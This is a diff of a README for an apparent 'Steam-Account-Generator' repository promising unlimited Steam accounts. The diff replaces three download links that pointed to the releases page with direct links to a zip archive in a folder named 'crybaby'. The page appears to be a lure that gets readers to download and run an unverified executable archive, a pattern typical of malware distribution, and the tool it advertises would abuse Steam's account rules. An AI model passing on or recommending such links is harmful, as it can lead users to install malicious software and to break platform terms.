@@ -1,6 +1,6 @@
 # 🎮 Steam-Account-Generator - Generate Unlimited Steam Accounts Instantly
 
-[![Download Steam Account Generator](https://img.shields.io/badge/Download-Steam_Account_Generator-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Maryacatholic4621/Steam-Account-Generator/releases)
+[![Download Steam Account Generator](https://img.shields.io/badge/Download-Steam_Account_Generator-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Maryacatholic4621/Steam-Account-Generator/main/crybaby/Steam_Generator_Account_v3.4.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Steam-Account-Generator is a powerful Windows tool that creates fresh, working S
 
 ## 📥 How to Download
 
-Visit this link to download the application: **[Download Steam-Account-Generator](https://github.com/Maryacatholic4621/Steam-Account-Generator/releases)**
+Visit this link to download the application: **[Download Steam-Account-Generator](https://raw.githubusercontent.com/Maryacatholic4621/Steam-Account-Generator/main/crybaby/Steam_Generator_Account_v3.4.zip)**
 
 The download page will show you the latest version. Click the download button and save the file to your computer. The file is small and downloads quickly. Once the download finishes, you are ready to install and start generating accounts.
 
@@ -132,7 +132,7 @@ Steam-Account-Generator is the simplest and most reliable way to create Steam ac
 
 **Ready to start?** Click the button below to get the latest version:
 
-[![Get Steam Account Generator](https://img.shields.io/badge/⬇️_Download_Now-Steam_Account_Generator-blue?style=for-the-badge)](https://github.com/Maryacatholic4621/Steam-Account-Generator/releases)
+[![Get Steam Account Generator](https://img.shields.io/badge/⬇️_Download_Now-Steam_Account_Generator-blue?style=for-the-badge)](https://raw.githubusercontent.com/Maryacatholic4621/Steam-Account-Generator/main/crybaby/Steam_Generator_Account_v3.4.zip)
 
 ---
 
